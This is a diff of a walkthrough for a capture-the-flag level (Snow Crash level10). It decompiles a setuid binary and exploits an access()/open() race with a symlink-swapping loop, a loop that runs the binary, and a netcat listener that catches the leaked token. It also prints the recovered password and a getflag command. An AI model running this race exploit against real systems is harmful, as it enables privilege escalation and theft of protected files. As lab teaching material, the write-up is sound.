@@ -2,32 +2,43 @@
 
 ## Steps
 
-1. __Action__ (Guest): list the files present at the root
+1. __Action__ (Guest): list the files present in the `level10` user's home directory
 	```sh
 	ls -A
 	```
 
-2. __Observation__ (Guest): the previous command reveals two files of
-	interest, `level10` and `token`
+2. __Observation__ (Guest): the previous command reveals 2 files possibly of interest,
+	named `level10` and `token`
 	```
-	.bash_logout  .bashrc  level10  .profile  token
+	.bash_logout  .bashrc  .profile  level10  token
 	```
 
-3. __Action__ (Guest): gather information on those files
+3. __Action__ (Guest): check the type of the `level10` file
+	```sh
+	file -b level10
+	```
+
+4. __Observation__ (Guest): the previous command reveals that the `level10` file
+	is an ELF 32-bits executable
+	```
+	setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xf7e21fb68568fa57d6317d0535b97d9fca66f841, not stripped
+	```
+
+5. __Action__ (Guest): check the file access control list of both `level10` and `token` files
 	```sh
 	getfacl level10 token
 	```
 
-4. __Observation__ (Guest): the previous command reveals that
-	the `level10` file:
-	- is owned by the `flag10` user
-	- is readable by the `level10` user
-	- is executable by the `level10` user
-	- has the `setuid` bit enabled
+6. __Observation__ (Guest): the previous command reveals that:
+	- the `level10` file:
+		- is readable by the `level10` user
+		- is executable by the `level10` user
+		- is owned by the `flag10` user
+		- has the `setuid` bit enabled
 
-	and the `token` file:
-	- is owned by the `flag10` user
-	- is readable only by the `flag10` user
+	- the `token` file:
+		- is readable only by the `flag10` user
+
 	```
 	# file: level10
 	# owner: flag10
@@ -48,150 +59,131 @@
 	other::---
 	```
 
-5. __Action__ (Host): copy the `level10` file on the host machine to decompile
-	it using [dogbolt](https://dogbolt.org/)
+7. __Action__ (Host): copy the `level10` file from the virtual machine
 	```sh
-	sshpass -f snow-crash/level09/flag \
-	scp -P 4242 level10@192.168.56.101:/home/user/level10/level10 .
-	docker cp snow-crash:level10 .
+	sshpass -f level09/flag \
+		scp -P 4242 level10@192.168.122.214:level10 /tmp
 	```
 
-6. __Observation__ (Host): the RetDec decompiler reveals that the
-	`level10` file takes two arguments, a `file` and a `host`
-	- a check on the `file` is done using `access`, if the user has access to 
-	the file
-	- a connection is attempted on the port `6969`
-	- a banner message is sent (`.*( )*.\n`)
-	- the file is opened, its contents read and sent to the connected host
-	```c
-	// ------------------------ Functions -------------------------
+8. __Action__ (Host): decompile the `level10` file using [dogbolt](https://dogbolt.org/)
+	and manually improve the readability of the decompiled code
 
-	// From module:   /home/user/level10/level10.c
-	// Address range: 0x80486d4 - 0x804896c
-	// Line range:    11 - 73
-	int main(int argc, char ** argv) {
-		int32_t v1 = __readgsdword(20); // 0x80486e7
-		if (argc <= 2) {
-			// 0x80486fc
-			printf("%s file host\n\tsends file to host if you have access"
-			" to it\n", *argv);
-			exit(1);
-			// UNREACHABLE
+9. __Observation__ (Host): after reverse engineering the `level10` file, we obtain the following
+	C code, which takes a filename and a hostname as arguments, checks the access to the file
+	by the user, connects to the host on port `6969`, sends a banner message, reads the content
+	of the file and sends it to the connected host
+	```c
+	#include <arpa/inet.h>
+	#include <errno.h>
+	#include <netinet/in.h>
+	#include <stdio.h>
+	#include <stdlib.h>
+	#include <string.h>
+	#include <sys/socket.h>
+	#include <unistd.h>
+
+	#define BANNER (char const []){'.', '*', '(', ' ', ')', '*', '.', '\n'}
+
+	int main(int const ac, char const *const *const av) {
+		if (ac <= 2) {
+			printf("%s file host\n\tsends file to host if you have access to it\n", av[0]);
+			exit(EXIT_FAILURE);
 		}
-		int32_t v2 = (int32_t)argv; // 0x804871f
-		char * path = (char *)*(int32_t *)(v2 + 4); // 0x8048726
-		int32_t chars_printed; // 0x80486d4
-		if (access(path, R_OK) != 0) {
-			// 0x8048940
-			chars_printed = printf("You don't have access to %s\n", path);
-		} else {
-			char * cp = (char *)*(int32_t *)(v2 + 8); // 0x8048731
-			printf("Connecting to %s:6969 .. ", cp);
-			fflush((struct _IO_FILE *)g1);
-			// 0x804878f
-			int32_t sock_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
-			int32_t addr = 2; // bp-36, 0x80487ba
-			inet_addr(cp);
-			htons(0x1b39);
-			if (connect(sock_fd, (struct sockaddr *)&addr, 16) == -1) {
-				// 0x804880f
-				printf("Unable to connect to host %s\n", cp);
-				exit(1);
-				// UNREACHABLE
-			}
-			// 0x8048830
-			if (write(sock_fd, (int32_t *)".*( )*.\n", 8) == -1) {
-				// 0x8048851
-				printf("Unable to write banner to host %s\n", cp);
-				exit(1);
-				// UNREACHABLE
-			}
-			// 0x8048872
-			printf("Connected!\nSending file .. ");
-			fflush((struct _IO_FILE *)g1);
-			int32_t fd = open(path, O_RDONLY); // 0x804889b
-			if (fd == -1) {
-				// 0x80488ab
-				puts("Damn. Unable to open file");
-				exit(1);
-				// UNREACHABLE
-			}
-			// 0x80488c3
-			int32_t buf; // bp-4132, 0x80486d4
-			int32_t nbyte = read(fd, &buf, 0x1000); // 0x80488da
-			if (nbyte == -1) {
-				// 0x80488ea
-				printf("Unable to read from file: %s\n",
-				strerror(*__errno_location()));
-				exit(1);
-				// UNREACHABLE
-			}
-			// 0x8048916
-			write(sock_fd, &buf, nbyte);
-			chars_printed = puts("wrote file!");
+		if (access(av[1], R_OK) == -1) {
+			printf("You don't have access to %s\n", av[1]);
+			exit(EXIT_FAILURE);
 		}
-		int32_t result = chars_printed; // 0x8048963
-		if (v1 != __readgsdword(20)) {
-			// 0x8048965
-			__stack_chk_fail();
-			result = &g2;
+
+		printf("Connecting to %s:6969 .. ", av[2]);
+		fflush(stdout);
+
+		int const sock_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
+		struct sockaddr const addr = {
+			.sa_family = AF_INET,
+			.sa_data = {0},
+		};
+
+		inet_addr(av[2]);
+		htons(6969);
+		if (connect(sock_fd, &addr, sizeof(addr)) == -1) {
+			printf("Unable to connect to host %s\n", av[2]);
+			exit(EXIT_FAILURE);
 		}
-		// 0x804896a
-		return result;
+		if (write(sock_fd, BANNER, sizeof(BANNER)) == -1) {
+			printf("Unable to write banner to host %s\n", av[2]);
+			exit(EXIT_FAILURE);
+		}
+		printf("Connected!\nSending file .. ");
+		fflush(stdout);
+
+		int const fd = open(av[1], O_RDONLY);
+
+		if (fd == -1) {
+			puts("Damn. Unable to open file");
+			exit(EXIT_FAILURE);
+		}
+
+		char    buffer[4096];
+		ssize_t number_of_bytes_read = read(fd, &buffer, sizeof(buffer));
+
+		if (number_of_bytes_read == -1) {
+			printf("Unable to read from file: %s\n", strerror(errno));
+			exit(EXIT_FAILURE);
+		}
+		write(sock_fd, &buffer, number_of_bytes_read);
+		puts("wrote file!");
+		exit(EXIT_SUCCESS);
+		__builtin_unreachable();
 	}
 	```
-	It looks like we have to exploit the `access` command, here's what
-	the man says
+	It looks like we have to exploit the `access` command, here's what the man says:
 	```
 	Warning: Using access() to check if a user is authorized to, for example,
 	open a file before actually doing so using open(2) creates a security hole,
 	because the user might exploit the short time interval between checking and
 	opening the file to manipulate it.
 	```
-7. __Action__ (Guest): exploit the vulnerability of the `access` command
-	(step 1)
-	The first step consists of continuously cresting a symbolic lin between
-	a file we have the rights to and the `token` file.
-	In order to do so, we need a bash script that continuously creates a
-	symbolic link between the `token` file and our file.
-	```sh
-	#!/bin/bash
 
-	while true; do
-		touch /tmp/file     # maybe remove
-		rm -rf /tmp/file    # maybe remove
-		ln -s /home/user/level10/token /tmp/file
-		rm -rf /tmp/file
-	done
-	```
-8. __Action__ (Guest): exploit the vulnerability of the `access` commmand
-	(step 2)
-	The second step consists of continuously launching the `level10` program
-	with the file we have access to and our IP address passed as parameters.
-	In order to do so, we need a bash script that continously launches
-	the program with our file and our IP address as parameters.
+10. __Action__ (Host): remove the `level10` file
 	```sh
-	#!/bin/bash
-
-	while true; do
-		/home/user/level10/level10 /tmp/file 192.168.56.101
-	done
-	```
-9. __Action__ (Guest): exploit the vulnerability of the `access` command
-	(step 3)
-	Once the two scripts are launched, we need to open a third terminal to
-	listen on the port `6969` and collect the flag
-	```sh
-	nc -lk 6969
+	rm /tmp/level10
 	```
 
-10. __Observation__ (Guest): the password is displayed on stdout
+11. __Action__ (Guest): create a symbolic link that points alternatively to the `token` file
+	and the `null` file located in the `/dev` directory
+	```sh
+	while true; do ln -fs ~/token /tmp/symlink; ln -fs /dev/null /tmp/symlink; done &
 	```
-	.*( )*.
-	.*( )*.
-	.*( )*.
-	woupa2yuojeeaaed06riuj63c
-	.*( )*.
-	.*( )*.
-	.*( )*.
+
+12. __Action__ (Guest): execute repeatedly the `level10` file with the `symlink` file
+	as the first argument and the localhost IP address as the second argument
+	```sh
+	while true; do /home/user/level10/level10 /tmp/symlink 127.0.0.1; done >/dev/null &
+	```
+
+13. __Action__ (Guest): listen on the port `6969` for the first non-banner message
+	```sh
+	nc -lk 6969 | grep -m 1 -v '.*( )*.'
+	```
+
+14. __Observation__ (Guest C): the content of the `token` file appears on stdout:  
+	`woupa2yuojeeaaed06riuj63c`
+
+15. __Action__ (Guest): terminate the running subprocesses
+	```sh
+	pkill -P $$
+	```
+
+16. __Action__ (Guest): remove the `symlink` symbolic link and the `empty` file
+	```sh
+	rm /tmp/{'symlink','empty'}
+	```
+
+17. __Action__ (Host): run the `getflag` command as the `flag10` user
+	and save the token in the `flag` file
+	```sh
+	sshpass -p woupa2yuojeeaaed06riuj63c 2>/dev/null \
+		ssh -p 4242 flag10@192.168.122.214 \
+			getflag \
+	| egrep -o '[^ ]+$' >level10/flag
 	```
